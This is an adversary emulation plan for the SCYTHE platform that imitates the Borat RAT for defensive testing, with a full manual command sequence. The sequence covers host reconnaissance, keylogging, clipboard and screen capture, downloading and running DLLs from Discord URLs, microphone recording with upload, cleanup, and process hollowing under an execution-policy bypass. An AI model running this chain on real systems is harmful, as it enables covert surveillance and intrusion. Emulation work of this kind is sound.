# Borat RAT - Adversary Emulation Plan

This threat was created by Randy Pargman from BinaryDefense based on the threat intelligence from March 31, 2022: https://blog.cyble.com/2022/03/31/deep-dive-analysis-borat-rat/

## Automated Adversary Emulation with SCYTHE

1. Download and import the threats in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under BoratRAT/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/
4. Create a new campaign `BoratRAT` with HTTPS
5. Import from Existing Threat: BoratRAT
6. Launch the Campaign

## Notes on unique functionality
1. This threat downloads two files (Audio.dll and Ransomware.dll) from Discord CDN URLs. They are hosted on a Discord server administered by Randy Pargman of Binary Defense, and are intended to stay available online for the foreseeable future. However, if you wish to host the files yourself, simply grab the copies of Audio.dll and Ransomware.dll from the VFS folder and upload to your own Discord server, then replace the URLs in the downloader steps.
2. The Ransomware.dll file does not actually encrypt any files. Its only purpose is to drop a ransom note that contains the same text as Borat RAT's ransom note, on the user's desktop.
3. The Audio.dll file is written in C# and it very closely matches the functionality of the real Borat RAT Audio.dll microphone recorder, except that it doesn't communicate over the Borat RAT packed message C2 channel. You can find the source code in the linked Github project (as a submodule).

## Manual Adversary Emulation with SCYTHE
Start a SCYTHE campaign and manually execute the below commands:
```
loader --load run
run cmd /c "echo ####System Info#### & systeminfo & echo ####System Vesion#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable##### & set & echo ####Logical Disk##### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators### & net localgroup administrators & echo ####Guest User#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipcofig#### & ipconfig /all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####FirewallInfo#### & netsh firewall show state & netsh firewall show config"
loader --load keylogger
keylogger --start
loader --load clipboard
clipboard
loader --load printscr
printscr --window Desktop
keylogger --current
keylogger --stop
run cmd.exe /c set
run wmic logicaldisk get caption,description,providername
run net user
run net user administrator
run wmic startup get caption,command
run tasklist /svc
run ipconfig /all
run cmd.exe /c type C:\WINDOWS\System32\drivers\etc\hosts
run route print
run arp -a
run netstat -ano
run sc query type= service state= all
run cmd.exe /c netsh firewall show state & netsh firewall show config
loader --load downloader
loader --load file
loader --load upsh
downloader --src "https://cdn.discordapp.com/attachments/853389026839756837/963125834342862878/AudioRecorder.dll" --dest %USERPROFILE%\Audio.dll
upsh --cmd $assembly = [Reflection.Assembly]::LoadFile("$env:USERPROFILE\Audio.dll"); $instance = New-Object AudioRecorder.AudioRecorer; $result =$instance.AudioInit(10);
delay --time 10
uploader --remotepath C:\Users\Public\Document\micaudio.log.txt
uploader --remotepath C:\Users\Public\Document\micaudio.wav
run powershell.exe del C:\Users\Public\Document\micaudio.log.txt
run powershell.exe del C:\Users\Public\Document\micaudio.wav
downloader --src "https://cdn.discordapp.com/attachments/853389026839756837/960944365335904286/Ransomware.dll" --dest %USERPROFILE%/Desktop/Ransomware.dll
run cmd /c cd %USERPROFILE%\Desktop & rundll32 Ransomware.dll,DropNote
run powershell del $env:USERPROFILE\Desktop\Ransomware.dll -Force -ErrorAction Ignore
downloader --src "https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Start-Hollow.ps1" --dest %USERPROFILE%/Start-Hollow.ps1
run powershell.exe Set-ExecutionPolicy Bypass -Scope Process -Force ; Invoke-Command -ScriptBlock {. $env:userprofile\Start-Hollow.ps1; $ppid="Get-Process explorer | select -expand id"; Start-Hollow -Sponsor "C:\Windows\System32\calc.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose}
upsh --cmd "Invoke-Command -ScriptBlock {Stop-Process -Name "calc" -ErrorAction Ignore; }"
run powershell.exe del $env:userprofile/Start-Hollow.ps1
controller --shutdown
```
